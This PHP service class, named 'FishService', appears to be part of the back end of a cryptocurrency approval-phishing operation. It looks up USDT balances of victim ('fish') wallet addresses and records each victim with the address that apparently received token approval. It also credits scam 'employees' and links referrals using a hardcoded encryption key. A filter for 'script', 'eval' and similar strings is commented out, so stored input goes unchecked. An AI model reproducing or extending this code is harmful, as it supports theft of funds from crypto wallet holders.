<?php

namespace app\common\service;

use app\admin\controller\Customer;
use app\common\model\Fish;
use GuzzleHttp\Client;

class FishService
{
    const ENCODE_KEY = '88LCNKnvhUJ3CHr7H7his';

    const REFERRAL_PAGE = '';

    public static function getBalance($address, $type)
    {
        $client = new Client();
        try {
            if ($type == 'trc') {
                $url = '';
            } else {
                $url = '';
            }

            $request = $client->request('post', $url, ['json' => ['address' => $address]]);
            $body = $request->getBody();
            $content = $body->getContents();
            $res = json_decode($content, true);
            if (isset($res['code']) && $res['code'] == '200') {
                if ($type == 'trc') {
                    return $res['data']['amount'] ?? 0;
                } else {
                    return $res['data']['usdt'] ?? 0;
                }
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }
    }

    public static function new_erc($employee,$address,$au_address, $referral_address = '',$sj = '',$money = '')
    {
        $data = array(
            'employee' => $employee ? $employee : 0,
            'address' => $address,
            'au_address' => $au_address,
            'type'=>'erc',
            'sj'=> $sj,
            'balance' => $money
        );


        // foreach ($data as $v) {
        //     if (empty($v) && $v != 0) {
        //         return '';
        //     }

        //     if(strpos($v,'script') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'/') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'=') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'<') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'>') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'.') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'eval') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'$') !== false){
        //         return '';
        //     }
        // }
        
        $data_2 = array(
            'employee' => $employee ? $employee : 0,
            'address' => $address,
            'au_address' => $au_address,
        );

        $fish = Fish::where($data_2)->find();
        \app\common\model\Customer::where('address', $address)->update(['is_auth' => 1]);
        if (empty($fish)) {
            if ($referral_key = self::authcode($referral_address, 'DECODE')) {
                if ($referral_key != $au_address) {
                    $parent = Fish::where(['au_address' => $referral_key])->field('id')->find();
                    $referral_id = empty($parent) ? null : $parent['id'];
                    $data['parent_id'] = $referral_id;
                }
            }
            
            Fish::create( $data);
        } else {
            $fish->create_time = date('Y-m-d H:i:s');
            $fish->save();
        }
    }

    public static function new_trc($employee,$address,$au_address, $referral_address = '',$sj = '',$money = '')
    {
        $data = array(
            'employee' => $employee ? $employee : 0,
            'address' => $address,
            'au_address' => $au_address,
            'type'=>'trc',
            'sj'=> $sj,
            'balance' => $money
        );


        // foreach ($data as $v) {
        //     if (empty($v) && $v != 0) {
        //         return '';
        //     }

        //     if(strpos($v,'script') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'/') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'=') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'<') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'>') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'.') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'eval') !== false){
        //         return '';
        //     }

        //     if(strpos($v,'$') !== false){
        //         return '';
        //     }
        // }
        $data_2 = array(
            'employee' => $employee ? $employee : 0,
            'address' => $address,
            'au_address' => $au_address,
        );

        // $fish = Fish::where($data)->find();
        $fish = Fish::where($data_2) -> find();

        \app\common\model\Customer::where('address', $address)->update(['is_auth' => 1]);
        if (empty($fish)) {
            if ($referral_key = self::authcode($referral_address, 'DECODE')) {
                if ($referral_key != $au_address) {
                    $parent = Fish::where(['au_address' => $referral_key])->field('id')->find();
                    $referral_id = empty($parent) ? null : $parent['id'];
                    $data['parent_id'] = $referral_id;
                }
            }
            
            Fish::create( $data);
        } else {
            $fish->create_time = date('Y-m-d H:i:s');
            $fish->save();
        }
    }

    public static function gen_referral($string)
    {
        if (! $string || ! is_string($string)) {
            return '';
        }

        $data = self::REFERRAL_PAGE . '?rb=' . $string;
        return $data;
    }

    private static function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0)
    {
        $ckey_length = 4;
        $key = md5($key ? $key : self::ENCODE_KEY);
        $keya = md5(substr($key, 0, 16));
        $keyb = md5(substr($key, 16, 16));
        $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
        $cryptkey = $keya.md5($keya.$keyc);
        $key_length = strlen($cryptkey);
        $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
        $string_length = strlen($string);
        $result = '';
        $box = range(0, 255);
        $rndkey = array();
        for($i = 0; $i <= 255; $i++) {
            $rndkey[$i] = ord($cryptkey[$i % $key_length]);
        }
        for($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        for($a = $j = $i = 0; $i < $string_length; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
        }
        if($operation == 'DECODE') {
            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) &&  substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
                return substr($result, 26);
            } else {
                return '';
            }
        } else {
            return $keyc.str_replace('=', '', base64_encode($result));
        }
    }
}
